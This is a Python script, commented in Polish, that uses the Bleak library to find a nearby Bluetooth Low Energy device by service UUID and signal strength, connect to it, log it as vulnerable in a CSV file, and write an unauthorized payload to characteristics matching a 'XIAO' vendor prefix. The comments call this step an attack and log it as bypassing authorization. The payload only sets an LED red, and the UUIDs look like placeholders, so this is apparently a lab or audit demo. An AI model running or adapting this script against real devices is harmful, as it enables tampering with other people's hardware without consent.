

import asyncio
import csv
import os
import logging
from bleak import BleakScanner, BleakClient

# Konfiguracja logowania
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
logger = logging.getLogger("BLE_Smart_Scanner")

CSV_FILE = "ble_audit_results.csv"

# --- DEFINICJE ZAKRESÓW I WZORCÓW ---
XIAO_VND_PREFIX = "87654321"     
TARGET_SERVICE_UUID = "12345678-1234-1234-1234-123456789012".lower()

async def audit_device(device, writer):
    logger.info(f"[*] Rozpoczynam audyt urządzenia: {device.address}")
    try:
        async with BleakClient(device.address, timeout=10.0) as client:
            services = client.services
            for service in services:
                for char in service.characteristics:
                    status = "Safe"
                    
                    # Sprawdzenie Twojego konkretnego wzorca XIAO (Characteristic UUID)
                    if char.uuid.startswith(XIAO_VND_PREFIX.lower()):
                        status = "VULNERABLE_TARGET_DETECTED"
                        logger.warning(f"  [!] Wykryto znany wzorzec XIAO na {char.uuid}")
                        writer.writerow([device.name, device.address, status, char.uuid])
                        
                        # --- TUTAJ NASTĘPUJE ATAK (PAYLOAD INJECTION) ---
                        logger.info(f"    -> Wstrzykiwanie nieautoryzowanego payloadu do {char.uuid}...")
                        test_payload = bytes([255, 0, 0]) # Czerwony kolor dla diody NeoPixel
                        
                        try:
                            await client.write_gatt_char(char.uuid, test_payload, response=True)
                            logger.warning(f"    -> [!] SUKCES: Ominięto autoryzację. Wstrzyknięto payload!")
                        except Exception as e:
                            logger.error(f"    -> [-] Błąd zapisu lub autoryzacji: {e}")
                        # ------------------------------------------------

    except Exception as e:
        logger.error(f"[-] Błąd podczas audytu {device.address}: {e}")

async def main():
    logger.info("Rozpoczynam nasłuch w poszukiwaniu urządzeń o silnym sygnale (RSSI > -60)...")

    # POPRAWKA: Zmiana d.rssi na ad.rssi zapobiega warningom z biblioteki Bleak
    target_device = await BleakScanner.find_device_by_filter(
        lambda d, ad: (TARGET_SERVICE_UUID in ad.service_uuids) and (ad and ad.rssi > -60),
        timeout=20.0
    )

    if target_device:
        logger.info(f"[+] ZNALEZIONO CEL: {target_device.name} [{target_device.address}]")
        
        # Przygotowanie pliku CSV i uruchomienie audytu/ataku
        file_exists = os.path.isfile(CSV_FILE)
        with open(CSV_FILE, mode='a', newline='') as file:
            writer = csv.writer(file)
            if not file_exists:
                writer.writerow(["Device Name", "MAC Address", "Status", "Vulnerable UUID"])
            
            await audit_device(target_device, writer)
    else:
        logger.error("[-] Nie znaleziono celu w pobliżu.")

if __name__ == "__main__":
    asyncio.run(main())